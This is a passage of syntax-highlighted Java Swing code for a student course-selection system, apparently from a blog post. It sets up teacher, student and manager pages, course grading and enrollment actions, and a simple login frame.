class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                teacher_c_layout.show(teacher_cards, <span class="string">&quot;teacher_score_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        menu_cards.add(<span class="string">&quot;teacher_menuBar&quot;</span>,teacher_menuBar);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_init_page</span></span><br><span class="line">        teacher_init_page.add(teacher_jl_init);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_new_course_page</span></span><br><span class="line">        teacher_score_page.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        teacher_view_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Teacher</span> <span class="variable">t</span> <span class="operator">=</span> (Teacher) user;</span><br><span class="line">                reloadScoreTea(t, (<span class="type">int</span>)teacher_jc_course.getSelectedItem());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        teacher_info_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Teacher</span> <span class="variable">t</span> <span class="operator">=</span> (Teacher) user;</span><br><span class="line">                t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem());</span><br><span class="line">                JOptionPane.showMessageDialog(<span class="literal">null</span>, <span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;课程编号: &quot;</span>+t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem()).get(<span class="number">1</span>)</span><br><span class="line">                        +<span class="string">&quot;&lt;br&gt;&quot;</span>+<span class="string">&quot;课程名称: &quot;</span>+t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem()).get(<span class="number">0</span>)</span><br><span class="line">                        +<span class="string">&quot;&lt;br&gt;&quot;</span>+<span class="string">&quot;课程信息: &quot;</span>+t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem()).get(<span class="number">2</span>)+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);<span class="comment">//t.getCourseInfo((int)teacher_jc_course.getSelectedItem()).toString()</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        teacher_score.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Teacher</span> <span class="variable">t</span> <span class="operator">=</span> (Teacher) user;</span><br><span class="line">                t.scoreStuCourse((<span class="type">int</span>)((List)teacher_score_jl.getSelectedValue()).get(<span class="number">0</span>), (<span class="type">int</span>)((List)teacher_score_jl.getSelectedValue()).get(<span class="number">1</span>), Integer.parseInt(teacher_jt_score.getText()));</span><br><span class="line">                reloadScoreTea(t, (<span class="type">int</span>)teacher_jc_course.getSelectedItem());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        teacher_score_north.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">                </span><br><span class="line">        teacher_score_north_course.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">2</span>));</span><br><span class="line">        teacher_score_north_course.add(teacher_jl_1);</span><br><span class="line">        teacher_score_north_course.add(teacher_jc_course);</span><br><span class="line">        teacher_score_north_course.add(teacher_view_course);</span><br><span class="line">        teacher_score_north_course.add(teacher_info_course);</span><br><span class="line">        teacher_score_south.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        teacher_score_south.add(teacher_jt_score);</span><br><span class="line">        teacher_score_south.add(teacher_score);</span><br><span class="line">        </span><br><span class="line">        teacher_score_north.add(<span class="string">&quot;North&quot;</span>,teacher_jl_0);</span><br><span class="line">        teacher_score_north.add(<span class="string">&quot;Center&quot;</span>,teacher_score_north_course);</span><br><span class="line">        teacher_score_page.add(<span class="string">&quot;North&quot;</span>,teacher_score_north);</span><br><span class="line">        teacher_score_page.add(<span class="string">&quot;Center&quot;</span>,teacher_score_jsp);</span><br><span class="line">        teacher_score_page.add(<span class="string">&quot;South&quot;</span>,teacher_score_south);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        teacher_cards.setLayout(teacher_c_layout);</span><br><span class="line">        teacher_cards.add(<span class="string">&quot;teacher_init_page&quot;</span>,teacher_init_page);</span><br><span class="line">        teacher_cards.add(<span class="string">&quot;teacher_score_page&quot;</span>,teacher_score_page);</span><br><span class="line"></span><br><span class="line">        content_cards.add(<span class="string">&quot;teacher_cards&quot;</span>,teacher_cards);   </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initStudentPage</span><span class="params">()</span> &#123;</span><br><span class="line">        student_select_course_jl.setCellRenderer(<span class="keyword">new</span> <span class="title class_">CourseSelCellRenderer</span>());</span><br><span class="line">        student_delect_course_jl.setCellRenderer(<span class="keyword">new</span> <span class="title class_">CourseDelCellRenderer</span>());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//student_cards student_menuBar</span></span><br><span class="line">        student_menuBar.add(student_menu_select_course);</span><br><span class="line">        student_menuBar.add(student_menu_delect_course);</span><br><span class="line">        student_menu_select_course.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                reloadCourseStuNotSelectedList((Student) user);</span><br><span class="line">                student_c_layout.show(student_cards, <span class="string">&quot;student_select_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        student_menu_delect_course.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                reloadScoreStuList((Student) user);</span><br><span class="line">                student_c_layout.show(student_cards, <span class="string">&quot;student_delect_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        student_menu_view_course.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                student_c_layout.show(student_cards, <span class="string">&quot;student_view_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        menu_cards.add(<span class="string">&quot;student_menuBar&quot;</span>,student_menuBar);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//student_cards student_init_page</span></span><br><span class="line">        student_init_page.add(student_jl_init);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//student_cards student_select_course_page</span></span><br><span class="line">        student_select_course_page.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        student_select_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> (Student)user;</span><br><span class="line">                HashMap&lt;Integer, List&gt; stu_not_course = s.getCourseStuNotSelected();</span><br><span class="line">                s.selStuCourse(((Entry&lt;Integer, List&gt;)student_select_course_jl.getSelectedValue()).getKey());</span><br><span class="line">                reloadCourseStuNotSelectedList(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//student_cards student_delect_course_page</span></span><br><span class="line">        student_delect_course_page.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        student_delect_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> (Student)user;</span><br><span class="line">                s.delStuCourse((<span class="type">int</span>)((List)student_delect_course_jl.getSelectedValue()).get(<span class="number">1</span>));</span><br><span class="line">                reloadScoreStuList(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        student_select_course_page.add(<span class="string">&quot;North&quot;</span>,student_jl_0_0);</span><br><span class="line">        student_select_course_page.add(<span class="string">&quot;Center&quot;</span>,student_select_course_jsp);</span><br><span class="line">        student_select_course_page.add(<span class="string">&quot;South&quot;</span>,student_select_course);</span><br><span class="line">        </span><br><span class="line">        student_delect_course_page.add(<span class="string">&quot;North&quot;</span>,student_jl_0_1);</span><br><span class="line">        student_delect_course_page.add(<span class="string">&quot;Center&quot;</span>,student_delect_course_jsp);</span><br><span class="line">        student_delect_course_page.add(<span class="string">&quot;South&quot;</span>,student_delect_course);</span><br><span class="line">        </span><br><span class="line">        student_view_score_page.add(student_jl_0_2);</span><br><span class="line"></span><br><span class="line">        student_cards.setLayout(student_c_layout);</span><br><span class="line">        student_cards.add(<span class="string">&quot;student_init_page&quot;</span>,student_init_page);</span><br><span class="line">        student_cards.add(<span class="string">&quot;student_select_course_page&quot;</span>,student_select_course_page);</span><br><span class="line">        student_cards.add(<span class="string">&quot;student_delect_course_page&quot;</span>,student_delect_course_page);</span><br><span class="line"></span><br><span class="line">        content_cards.add(<span class="string">&quot;student_cards&quot;</span>,student_cards);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initManagerPage</span><span class="params">()</span> &#123;</span><br><span class="line">        manager_jc_teacher.setRenderer(<span class="keyword">new</span> <span class="title class_">TeaCellRenderer</span>());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_menuBar</span></span><br><span class="line">        manager_menuBar.add(manager_menu);</span><br><span class="line">        manager_menu.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                manager_c_layout.show(manager_cards, <span class="string">&quot;manager_new_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        menu_cards.add(<span class="string">&quot;manager_menuBar&quot;</span>,manager_menuBar);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_init_page</span></span><br><span class="line">        manager_init_page.add(manager_jl_init);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_new_course_page</span></span><br><span class="line">        manager_new_course_page.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line">        manager_new_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                Entry&lt;Integer,String&gt; t = (Entry&lt;Integer, String&gt;) manager_jc_teacher.getSelectedItem();</span><br><span class="line">                <span class="type">Manager</span> <span class="variable">m</span> <span class="operator">=</span> (Manager)user;</span><br><span class="line">                m.newCourse(manager_jt_course_name.getText(), t.getKey(), manager_jt_course_info.getText());</span><br><span class="line">                manager_jt_course_name.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                manager_jt_course_info.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                JOptionPane.showMessageDialog(<span class="literal">null</span>, <span class="string">&quot;课程添加成功！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        manager_new_course_page.add(manager_jl_0);</span><br><span class="line">        manager_new_course_page.add(manager_jl_1);</span><br><span class="line">        manager_new_course_page.add(manager_jt_course_name);</span><br><span class="line">        manager_new_course_page.add(manager_jl_2);</span><br><span class="line">        manager_new_course_page.add(manager_jc_teacher);</span><br><span class="line">        manager_new_course_page.add(manager_jl_3);</span><br><span class="line">        manager_new_course_page.add(manager_jt_course_info);</span><br><span class="line">        manager_new_course_page.add(manager_new_course);</span><br><span class="line"></span><br><span class="line">        manager_cards.setLayout(manager_c_layout);</span><br><span class="line">        manager_cards.add(<span class="string">&quot;manager_init_page&quot;</span>,manager_init_page);</span><br><span class="line">        manager_cards.add(<span class="string">&quot;manager_new_course_page&quot;</span>,manager_new_course_page);</span><br><span class="line"></span><br><span class="line">        content_cards.add(<span class="string">&quot;manager_cards&quot;</span>,manager_cards);   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置当前用户，由登录界面调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUser</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">        <span class="keyword">if</span>(user.getType()==<span class="number">0</span>) &#123;</span><br><span class="line">            setTeacherList();</span><br><span class="line">            manager_jl_0.setText(<span class="string">&quot;管理员:&quot;</span>+user.getUsername()+<span class="string">&quot; 编号:&quot;</span>+user.getUserId());</span><br><span class="line">            manager_jl_init.setText(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;欢迎来到选课系统&lt;br&gt;&quot;</span>+<span class="string">&quot;管理员:&quot;</span>+user.getUsername()+<span class="string">&quot; 编号:&quot;</span>+user.getUserId()+<span class="string">&quot;&lt;br&gt;请选择功能&quot;</span>+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            content_c_layout.show(content_cards, <span class="string">&quot;manager_cards&quot;</span>);</span><br><span class="line">            menu_c_layout.show(menu_cards, <span class="string">&quot;manager_menuBar&quot;</span>);</span><br><span class="line">            manager_c_layout.show(manager_cards, <span class="string">&quot;manager_init_page&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(user.getType()==<span class="number">1</span>) &#123;</span><br><span class="line">            setTeacherList_course();</span><br><span class="line">            teacher_jl_0.setText(<span class="string">&quot;教师: &quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            teacher_jl_init.setText(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;欢迎来到选课系统&lt;br&gt;&quot;</span>+<span class="string">&quot;教师: &quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId()+<span class="string">&quot;&lt;br&gt;请选择功能&quot;</span>+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            content_c_layout.show(content_cards, <span class="string">&quot;teacher_cards&quot;</span>);</span><br><span class="line">            menu_c_layout.show(menu_cards, <span class="string">&quot;teacher_menuBar&quot;</span>);</span><br><span class="line">            teacher_c_layout.show(teacher_cards, <span class="string">&quot;teacher_init_page&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(user.getType()==<span class="number">2</span>) &#123;</span><br><span class="line">            student_jl_0_0.setText(<span class="string">&quot;学生姓名:&quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            student_jl_0_1.setText(<span class="string">&quot;学生姓名:&quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            student_jl_0_2.setText(<span class="string">&quot;学生姓名:&quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            student_jl_init.setText(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;欢迎来到选课系统&lt;br&gt;&quot;</span>+<span class="string">&quot;学生: &quot;</span>+user.getUsername()+<span class="string">&quot;    编号: &quot;</span>+user.getUserId()+<span class="string">&quot;&lt;br&gt;请选择功能&quot;</span>+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            content_c_layout.show(content_cards, <span class="string">&quot;student_cards&quot;</span>);</span><br><span class="line">            menu_c_layout.show(menu_cards, <span class="string">&quot;student_menuBar&quot;</span>);</span><br><span class="line">            student_c_layout.show(student_cards, <span class="string">&quot;student_init_page&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTeacherList</span><span class="params">()</span> &#123;</span><br><span class="line">        manager_jc_teacher.removeAllItems();</span><br><span class="line">        HashMap&lt;Integer, String&gt; teacher = db.getTeacher();</span><br><span class="line">        <span class="keyword">for</span>(Entry&lt;Integer, String&gt; entry:teacher.entrySet()) &#123;</span><br><span class="line">            manager_jc_teacher.addItem(entry);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//更新教师界面中选中课程的选课信息</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reloadScoreTea</span><span class="params">(Teacher t, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        teacher_score_dlm.clear();</span><br><span class="line">        ArrayList&lt;List&gt; teacher_course = t.getScoreTeacher(course_id);</span><br><span class="line">        <span class="keyword">for</span>(List l:teacher_course) &#123;</span><br><span class="line">            teacher_score_dlm.addElement(l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTeacherList_course</span><span class="params">()</span> &#123;</span><br><span class="line">        teacher_jc_course.removeAllItems();</span><br><span class="line">        List&lt;Integer&gt; teacher_course = db.getTeacherCourse(user.getUserId());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> l:teacher_course) &#123;</span><br><span class="line">            teacher_jc_course.addItem(l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 更新学生界面中学生可选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reloadCourseStuNotSelectedList</span><span class="params">(Student s)</span> &#123;</span><br><span class="line">        student_select_course_dlm.clear();</span><br><span class="line">    </span><br><span class="line">        HashMap&lt;Integer, List&gt; course = s.getCourseStuNotSelected();</span><br><span class="line">        <span class="keyword">for</span>(Entry&lt;Integer, List&gt; entry:course.entrySet()) &#123;</span><br><span class="line">            student_select_course_dlm.addElement(entry);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 更新学生界面中学生已选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reloadScoreStuList</span><span class="params">(Student s)</span> &#123;</span><br><span class="line">        student_delect_course_dlm.clear();</span><br><span class="line">        ArrayList&lt;List&gt; student_score = s.getScoreStu();</span><br><span class="line">        <span class="keyword">for</span>(List l:student_score) &#123;</span><br><span class="line">            student_delect_course_dlm.addElement(l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initFrame</span><span class="params">(LoginFrame login_frame)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.login_frame = login_frame;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 清空该用户信息。退出界面时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> &#123;</span><br><span class="line">        teacher_score_dlm.clear();</span><br><span class="line">        manager_jt_course_name.setText(<span class="literal">null</span>);</span><br><span class="line">        manager_jt_course_info.setText(<span class="literal">null</span>);</span><br><span class="line">        teacher_jt_score.setText(<span class="literal">null</span>);</span><br><span class="line">        user = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MainFrame manager_frame;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">tf_user</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPasswordField</span> <span class="variable">tf_pwd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPasswordField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">login</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;登录&quot;</span>);      <span class="comment">// 用户登录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">jl_login</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> Database db;</span><br><span class="line">    <span class="keyword">private</span> Teach teach;</span><br><span class="line">    <span class="keyword">private</span> User u;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginFrame</span><span class="params">(Database db, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;选课系统登录&quot;</span>);        </span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="built_in">this</span>.db = db;</span><br><span class="line">        <span class="built_in">this</span>.teach = teach;</span><br><span class="line">        setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        setLocation(<span class="number">800</span>,<span class="number">400</span>);</span><br><span class="line">        setSize(<span class="number">250</span>,<span class="number">200</span>);</span><br><span class="line">        login.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> verifyUser(tf_user.getText(), String.valueOf(tf_pwd.getPassword()));</span><br><span class="line">                <span class="keyword">if</span>(user==<span class="literal">null</span>) &#123;</span><br><span class="line">                    jl.setText(<span class="string">&quot;user or pwd error&quot;</span>); </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    tf_user.setText(<span class="literal">null</span>);</span><br><span class="line">                    tf_pwd.setText(<span class="literal">null</span>);</span><br><span class="line">                    setVisible(<span class="literal">false</span>);</span><br><span class="line">                    manager_frame.setUser(user);</span><br><span class="line">                    manager_frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">                    jl.setText(<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;);</span><br><span class="line">        add(tf_user);</span><br><span class="line">        add(tf_pwd);</span><br><span class="line">        add(login);</span><br><span class="line">        add(jl);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initFrame</span><span class="params">(MainFrame manager_frame)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.manager_frame = manager_frame;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 验证用户名密码。如果正确，返回用户对象；如果错误，返回null</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">verifyUser</span><span class="params">(String user, String pwd)</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">account</span> <span class="operator">=</span> db.getAccount(user);</span><br><span class="line">        u = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(account == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pwd.compareTo((String)account.get(<span class="number">0</span>))==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)account.get(<span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                u = <span class="keyword">new</span> <span class="title class_">Manager</span>(user, pwd, (<span class="type">int</span>)account.get(<span class="number">1</span>),(<span class="type">int</span>)account.get(<span class="number">2</span>),(String)account.get(<span class="number">3</span>), teach);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((<span class="type">int</span>)account.get(<span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">                u = <span class="keyword">new</span> <span class="title class_">Teacher</span>(user, pwd, (<span class="type">int</span>)account.get(<span class="number">1</span>),(<span class="type">int</span>)account.get(<span class="number">2</span>),(String)account.get(<span class="number">3</span>), teach);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((<span class="type">int</span>)account.get(<span class="number">1</span>) == <span class="number">2</span>) &#123;</span><br><span class="line">                u = <span class="keyword">new</span> <span class="title class_">Student</span>(user, pwd, (<span class="type">int</span>)account.get(<span class="number">1</span>),(<span class="type">int</span>)account.get(<span class="number">2</span>),(String)account.get(<span class="number">3</span>), teach);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> u;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span 